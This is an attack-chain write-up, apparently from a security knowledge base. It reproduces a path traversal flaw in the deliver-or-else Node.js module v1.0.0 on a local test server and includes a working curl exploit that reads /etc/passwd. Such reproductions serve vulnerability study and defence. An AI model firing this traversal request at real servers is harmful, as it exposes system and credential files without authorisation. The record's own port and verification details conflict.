---
id: ac-uuid-1234-5678
tags:
  - path-traversal
  - node-js
  - arbitrary-file-read
  - vulnerability
type: attack_chain
tools:
  - '[[tools/npm]]'
  - '[[tools/node]]'
  - '[[tools/curl]]'
tactics:
  - '[[Initial Access]]'
  - '[[Discovery]]'
verified: false
platforms:
  - Web
  - Node.js
  - Linux
submitted: true
complexity: medium
created_at: '2023-10-01T12:00:00Z'
procedures:
  - '[[procedures/Install-Vulnerable-deliver-or-else-Module]]'
  - '[[procedures/Create-Test-Server-Script]]'
  - '[[procedures/Start-Vulnerable-Server]]'
  - '[[procedures/Test-Normal-Path-Restrictions]]'
  - '[[procedures/Exploit-Path-Traversal-with-curl]]'
step_count: 5
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[File and Directory Discovery]]'
updated_at: '2025-12-14T17:26:05.771Z'
description: >-
  Demonstrates exploitation of a path traversal vulnerability in the
  deliver-or-else Node.js module (v1.0.0) to bypass directory restrictions and
  read sensitive system files like /etc/passwd.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Discovery]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[File and Directory Discovery]]'
---
# Path Traversal in deliver-or-else Node.js Module to Read Arbitrary System Files

Multi-stage attack chain demonstrating exploitation of a path traversal vulnerability in the deliver-or-else Node.js module version 1.0.0, allowing attackers to read arbitrary files on the server by bypassing directory restrictions in the URL path.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 5 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Install Module] --> B[Setup Server]
    B --> C[Start Server]
    C --> D[Test Restrictions]
    D --> E[Exploit Traversal]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#f39c12
    style D fill:#3498db
    style E fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/npm]]
- [[tools/node]]
- [[tools/curl]]

### Target Environment

- Node.js runtime environment
- Linux-based server (for /etc/passwd access)
- Ports 80 or 8080 open for HTTP server

### Initial Access Requirements

- Local machine with Node.js installed
- No remote access needed; local reproduction for testing
- npm access to install modules

## Detailed Attack Procedures

### Step 1: Install Vulnerable Module
procedure: [[procedures/Install-Vulnerable-deliver-or-else-Module]]

**Objective**: Obtain the vulnerable deliver-or-else module version 1.0.0 for testing the path traversal issue.

**Instructions**: Use [[commands/npm-install-deliver-or-else]] to install the module via npm.

```bash
npm i deliver-or-else
```

**Expected Output**: Installation logs confirming the module is added to node_modules, with version 1.0.0.

**Success Indicators**:
- Module files appear in node_modules/deliver-or-else
- No installation errors

### Step 2: Create Test Server Script
procedure: [[procedures/Create-Test-Server-Script]]

**Objective**: Set up a local HTTP server script using the vulnerable module to serve files from a 'public' directory.

**Instructions**: Manually create a test.js file with the following code:

```javascript
const Deliver = require('deliver-or-else');
const path = require('path');
const http = require('http');

const deliver = new Deliver(path.join(__dirname, 'public'));
const server = http.createServer((req, res) => {
  deliver.deliver(req, res).catch(err => {
    if (err.status === 404) {
      res.writeHead(404);
      res.end('Not Found');
    }
  });
});
server.listen(80, '127.0.0.1', () => {
  console.log('Starting server...');
});
```

**Expected Output**: Script file created successfully.

**Success Indicators**:
- test.js file exists in the working directory
- Code resolves document root to ./public and handles requests

### Step 3: Start Vulnerable Server
procedure: [[procedures/Start-Vulnerable-Server]]

**Objective**: Launch the HTTP server to expose the vulnerable endpoint.

**Instructions**: Execute [[commands/node-run-test-script]] to start the server.

```bash
node test.js
```

**Expected Output**: Console output 'Starting server...' and server listening on 127.0.0.1:80.

**Success Indicators**:
- Server process running without errors
- Localhost:80 accessible

### Step 4: Test Normal Path Restrictions
procedure: [[procedures/Test-Normal-Path-Restrictions]]

**Objective**: Verify that standard requests for files outside the public directory are blocked with 404 errors.

**Instructions**: Attempt a normal HTTP request to a traversal path without special flags, e.g., using a browser or basic curl to http://127.0.0.1:80/../etc/passwd. The module's error handling should return 404.

**Expected Output**: 404 Not Found response.

**Success Indicators**:
- Requests normalized and blocked
- No file access outside public directory

### Step 5: Exploit Path Traversal
procedure: [[procedures/Exploit-Path-Traversal-with-curl]]

**Objective**: Bypass path normalization to read arbitrary system files like /etc/passwd.

**Instructions**: Use [[commands/curl-path-traversal-exploit]] with --path-as-is to prevent normalization and traverse from node_modules to /etc/passwd.

```bash
curl -v --path-as-is http://127.0.0.1:8080/node_modules/../../../../../etc/passwd
```

(Note: Adjust port to 80 if server is on 80; 8080 may be for a variant setup.)

**Expected Output**: Verbose HTTP details followed by contents of /etc/passwd file.

**Success Indicators**:
- Arbitrary file contents retrieved
- No 404 error; successful traversal

## Attack Chain Summary

### Key Achievements

1. Successful installation and setup of vulnerable Node.js module
2. Reproduction of path traversal bypass using curl's --path-as-is
3. Arbitrary file read demonstrating data breach potential

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[File and Directory Discovery]] File and Directory Discovery

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access
- [[Discovery]] Discovery

---
*Last updated: 2023-10-01T12:00:00Z*
